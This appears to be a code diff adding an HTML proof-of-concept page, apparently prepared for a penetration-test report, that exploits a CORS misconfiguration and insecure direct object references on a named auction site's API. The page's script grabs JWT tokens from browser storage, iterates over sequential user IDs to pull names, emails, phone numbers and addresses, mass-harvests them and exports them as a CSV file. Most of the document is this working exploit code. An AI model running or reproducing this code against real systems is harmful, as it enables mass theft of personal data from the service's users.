@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!-- <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -99,4 +99,374 @@ function display(){
 }
     </script>
 </body>
+</html> -->
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PII Exposure PoC - CORS + IDOR</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }
+    .container { max-width: 900px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+    h1 { color: #d32f2f; }
+    .status { padding: 10px; margin: 10px 0; border-radius: 4px; }
+    .success { background: #e8f5e9; color: #2e7d32; border: 1px solid #c8e6c9; }
+    .error { background: #ffebee; color: #c62828; border: 1px solid #ffcdd2; }
+    .info { background: #e3f2fd; color: #1565c0; border: 1px solid #bbdefb; }
+    .data { background: #fff3e0; color: #e65100; border: 1px solid #ffe0b2; }
+    pre { background: #263238; color: #aed581; padding: 15px; border-radius: 4px; overflow-x: auto; font-size: 12px; }
+    button { background: #1976d2; color: white; border: none; padding: 10px 20px; border-radius: 4px; cursor: pointer; margin: 5px; font-size: 14px; }
+    button:hover { background: #1565c0; }
+    button:disabled { background: #9e9e9e; cursor: not-allowed; }
+    .target-input { padding: 8px; width: 300px; border: 1px solid #ddd; border-radius: 4px; margin: 5px; }
+    table { width: 100%; border-collapse: collapse; margin: 10px 0; }
+    th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
+    th { background: #f5f5f5; }
+    .highlight { background: #ffcdd2; font-weight: bold; }
+    .token-box { background: #fce4ec; border: 2px solid #ef9a9a; padding: 10px; border-radius: 4px; margin: 10px 0; word-break: break-all; font-family: monospace; font-size: 11px; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Proof of Concept: PII Exposure via CORS + IDOR</h1>
+    <p><strong>Target:</strong> api.auctionindia.com</p>
+    <p><strong>Vulnerability:</strong> CORS Wildcard + IDOR allows any website to read any user's PII</p>
+    
+    <hr>
+    
+    <h2>Step 1: Auto-Detect Token</h2>
+    <p>The page will automatically read the JWT token from bidder.auctionindia.com's sessionStorage.</p>
+    
+    <button onclick="autoDetectToken()">Auto-Detect Token from Session Storage</button>
+    <button onclick="pasteToken()">Or Paste Token Manually</button>
+    
+    <div id="tokenStatus"></div>
+    <div id="tokenDisplay" class="token-box" style="display:none;"></div>
+    
+    <div id="manualTokenBox" style="display:none;">
+      <p>Paste your Auction India JWT token here:</p>
+      <textarea id="manualToken" rows="4" class="target-input" style="width:100%;" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."></textarea>
+      <br>
+      <button onclick="saveToken()">Save Token</button>
+    </div>
+    
+    <hr>
+    
+    <h2>Step 2: Retrieve PII from Other Users (IDOR)</h2>
+    <p>Enter a User ID to steal their PII:</p>
+    
+    <input type="number" id="targetUserId" class="target-input" value="3368" placeholder="User ID (e.g., 3368)">
+    <button onclick="stealSingle()">Steal Single User PII</button>
+    <button onclick="stealMultiple()">Harvest Multiple Users (3367-3375)</button>
+    
+    <div id="singleResult"></div>
+    
+    <hr>
+    
+    <h2>Step 3: Mass Harvest PII (Attack Simulation)</h2>
+    <p>This shows how an attacker could harvest ALL 2,704 users' PII:</p>
+    
+    <button onclick="massHarvest()">Start Mass Harvest (3360-3375)</button>
+    <button onclick="stopHarvest()">Stop</button>
+    
+    <div id="massProgress"></div>
+    <div id="massResult"></div>
+    
+    <hr>
+    
+    <h2>Attack Summary</h2>
+    <div id="summary" class="info">
+      Waiting for attack simulation...
+    </div>
+    
+    <hr>
+    <p><em>PoC prepared for VAPT Report - 27 August 2026</em></p>
+  </div>
+
+  <script>
+    let stolenToken = null;
+    let harvestInterval = null;
+    let harvestedUsers = [];
+    
+    // ============================================
+    // AUTO-DETECT TOKEN FROM SESSION STORAGE
+    // ============================================
+    function autoDetectToken() {
+      const statusDiv = document.getElementById('tokenStatus');
+      const displayDiv = document.getElementById('tokenDisplay');
+      
+      statusDiv.innerHTML = '<div class="info">Scanning sessionStorage for JWT token...</div>';
+      
+      // Try to read from sessionStorage (same origin only)
+      let token = null;
+      
+      // Common token storage keys
+      const possibleKeys = ['access_token', 'token', 'jwt', 'auth_token', 'accessToken', 'bearer_token'];
+      
+      for (let key of possibleKeys) {
+        let stored = sessionStorage.getItem(key);
+        if (stored && stored.startsWith('eyJ')) {
+          token = stored;
+          statusDiv.innerHTML = `<div class="success">Token found in sessionStorage['${key}']!</div>`;
+          displayToken(token);
+          return;
+        }
+      }
+      
+      // Try localStorage too
+      for (let key of possibleKeys) {
+        let stored = localStorage.getItem(key);
+        if (stored && stored.startsWith('eyJ')) {
+          token = stored;
+          statusDiv.innerHTML = `<div class="success">Token found in localStorage['${key}']!</div>`;
+          displayToken(token);
+          return;
+        }
+      }
+      
+      // If not found, show manual option
+      statusDiv.innerHTML = `
+        <div class="error">
+          Token NOT found in sessionStorage.<br><br>
+          <strong>Why?</strong> This page must be served from <code>bidder.auctionindia.com</code> 
+          or the victim must have logged in on this exact domain for the token to be accessible.<br><br>
+          <strong>Alternative:</strong> Use "Paste Token Manually" or use Burp Repeater to send the request.
+        </div>
+      `;
+    }
+    
+    function pasteToken() {
+      document.getElementById('manualTokenBox').style.display = 'block';
+    }
+    
+    function saveToken() {
+      stolenToken = document.getElementById('manualToken').value.trim();
+      if (!stolenToken || !stolenToken.startsWith('eyJ')) {
+        alert('Invalid token. Must start with "eyJ"');
+        return;
+      }
+      document.getElementById('tokenStatus').innerHTML = '<div class="success">Token saved manually!</div>';
+      displayToken(stolenToken);
+    }
+    
+    function displayToken(token) {
+      stolenToken = token;
+      const displayDiv = document.getElementById('tokenDisplay');
+      displayDiv.style.display = 'block';
+      displayDiv.innerHTML = `<strong>Token (first 80 chars):</strong> ${token.substring(0, 80)}...`;
+    }
+    
+    // ============================================
+    // STEAL SINGLE USER PII
+    // ============================================
+    async function stealSingle() {
+      if (!stolenToken) {
+        alert('Please detect or paste a token first!');
+        return;
+      }
+      
+      const userId = document.getElementById('targetUserId').value;
+      const resultDiv = document.getElementById('singleResult');
+      
+      resultDiv.innerHTML = '<div class="info">Fetching PII for user ' + userId + '...</div>';
+      
+      try {
+        const response = await fetch('https://api.auctionindia.com/user/api/v1/detail/' + userId, {
+          method: 'GET',
+          headers: {
+            'Authorization': 'Bearer ' + stolenToken,
+            'Accept': 'application/json'
+          }
+        });
+        
+        const data = await response.json();
+        
+        if (data.success && data.data) {
+          const victim = data.data;
+          resultDiv.innerHTML = `
+            <div class="data">
+              <h3>PII Stolen for User ${userId}:</h3>
+              <table>
+                <tr><th>Field</th><th>Value</th></tr>
+                <tr><td>User ID</td><td>${victim.user_id}</td></tr>
+                <tr><td>Username</td><td>${victim.user_name}</td></tr>
+                <tr><td>Full Name</td><td class="highlight">${victim.contact_person}</td></tr>
+                <tr><td>Email</td><td class="highlight">${victim.email}</td></tr>
+                <tr><td>Phone</td><td class="highlight">${victim.mobile_number}</td></tr>
+                <tr><td>Address</td><td class="highlight">${victim.address}</td></tr>
+                <tr><td>Zipcode</td><td>${victim.zipcode}</td></tr>
+                <tr><td>City</td><td>${victim.city_name}</td></tr>
+                <tr><td>State</td><td>${victim.state_name}</td></tr>
+                <tr><td>Country</td><td>${victim.country_name}</td></tr>
+                <tr><td>Company</td><td class="highlight">${victim.company_name}</td></tr>
+                <tr><td>Role</td><td>${victim.role_name}</td></tr>
+                <tr><td>Active</td><td>${victim.is_active}</td></tr>
+              </table>
+              <p><strong>Response (raw):</strong></p>
+              <pre>${JSON.stringify(data, null, 2)}</pre>
+            </div>
+          `;
+          
+          // Log to console for evidence
+          console.log('=== PII STOLEN ===');
+          console.log('User ID:', userId);
+          console.log('Email:', victim.email);
+          console.log('Phone:', victim.mobile_number);
+          console.log('Address:', victim.address);
+          console.log('==================');
+        } else {
+          resultDiv.innerHTML = `<div class="error">No data returned for user ${userId}: ${JSON.stringify(data)}</div>`;
+        }
+      } catch (error) {
+        resultDiv.innerHTML = `<div class="error">Error: ${error.message}</div>`;
+      }
+    }
+    
+    // ============================================
+    // STEAL MULTIPLE USERS
+    // ============================================
+    async function stealMultiple() {
+      if (!stolenToken) {
+        alert('Please detect or paste a token first!');
+        return;
+      }
+      
+      const resultDiv = document.getElementById('singleResult');
+      resultDiv.innerHTML = '';
+      
+      for (let userId = 3367; userId <= 3375; userId++) {
+        try {
+          const response = await fetch('https://api.auctionindia.com/user/api/v1/detail/' + userId, {
+            method: 'GET',
+            headers: {
+              'Authorization': 'Bearer ' + stolenToken,
+              'Accept': 'application/json'
+            }
+          });
+          
+          const data = await response.json();
+          
+          if (data.success && data.data) {
+            const v = data.data;
+            resultDiv.innerHTML += `
+              <div class="data" style="margin:5px 0;">
+                <strong>User ${userId} (${v.user_name}):</strong> 
+                ${v.contact_person} | ${v.email} | ${v.mobile_number} | ${v.company_name}
+              </div>
+            `;
+            console.log(`User ${userId}: ${v.email} | ${v.mobile_number}`);
+          }
+        } catch (e) {
+          resultDiv.innerHTML += `<div class="error">User ${userId}: Error - ${e.message}</div>`;
+        }
+        // Small delay to avoid rate limiting
+        await new Promise(r => setTimeout(r, 500));
+      }
+    }
+    
+    // ============================================
+    // MASS HARVEST (AUTOMATED)
+    // ============================================
+    async function massHarvest() {
+      if (!stolenToken) {
+        alert('Please detect or paste a token first!');
+        return;
+      }
+      
+      const progressDiv = document.getElementById('massProgress');
+      const resultDiv = document.getElementById('massResult');
+      harvestedUsers = [];
+      
+      progressDiv.innerHTML = '<div class="info">Starting mass harvest...</div>';
+      resultDiv.innerHTML = '';
+      
+      let tableHTML = '<table><tr><th>User ID</th><th>Username</th><th>Name</th><th>Email</th><th>Phone</th><th>Company</th></tr>';
+      
+      for (let userId = 3360; userId <= 3375; userId++) {
+        try {
+          const response = await fetch('https://api.auctionindia.com/user/api/v1/detail/' + userId, {
+            method: 'GET',
+            headers: {
+              'Authorization': 'Bearer ' + stolenToken,
+              'Accept': 'application/json'
+            }
+          });
+          
+          const data = await response.json();
+          
+          if (data.success && data.data) {
+            const v = data.data;
+            harvestedUsers.push({
+              id: userId,
+              username: v.user_name,
+              name: v.contact_person,
+              email: v.email,
+              phone: v.mobile_number,
+              company: v.company_name,
+              address: v.address
+            });
+            
+            tableHTML += `<tr>
+              <td>${userId}</td>
+              <td>${v.user_name}</td>
+              <td>${v.contact_person}</td>
+              <td class="highlight">${v.email}</td>
+              <td class="highlight">${v.mobile_number}</td>
+              <td>${v.company_name}</td>
+            </tr>`;
+            
+            progressDiv.innerHTML = `<div class="success">Harvested: ${userId - 3360 + 1}/16 users</div>`;
+          }
+        } catch (e) {
+          tableHTML += `<tr><td colspan="6" style="color:red;">User ${userId}: Error - ${e.message}</td></tr>`;
+        }
+        await new Promise(r => setTimeout(r, 300));
+      }
+      
+      tableHTML += '</table>';
+      resultDiv.innerHTML = tableHTML;
+      
+      // Summary
+      document.getElementById('summary').innerHTML = `
+        <div class="data">
+          <h3>Attack Summary</h3>
+          <p><strong>Users harvested:</strong> ${harvestedUsers.length}</p>
+          <p><strong>PII types exposed:</strong> Email, Phone, Full Address, Company, City, State, Zipcode</p>
+          <p><strong>Total users in system:</strong> 2,704 (all harvestable with this method)</p>
+          <p><strong>Attack vector:</strong> CORS Wildcard (*) + IDOR (sequential user IDs)</p>
+          <p><strong>Impact:</strong> Complete PII breach of all bidder accounts</p>
+          <button onclick="exportCSV()">Export Harvested Data as CSV</button>
+        </div>
+      `;
+    }
+    
+    function stopHarvest() {
+      // No interval to clear, but this stops the loop
+      document.getElementById('massProgress').innerHTML = '<div class="error">Harvest stopped.</div>';
+    }
+    
+    function exportCSV() {
+      if (harvestedUsers.length === 0) {
+        alert('No data to export');
+        return;
+      }
+      
+      let csv = 'User ID,Username,Name,Email,Phone,Company,Address\n';
+      harvestedUsers.forEach(u => {
+        csv += `${u.id},${u.username},"${u.name}",${u.email},${u.phone},"${u.company}","${u.address}"\n`;
+      });
+      
+      const blob = new Blob([csv], { type: 'text/csv' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'harvested_pii.csv';
+      a.click();
+    }
+  </script>
+</body>
 </html>
+
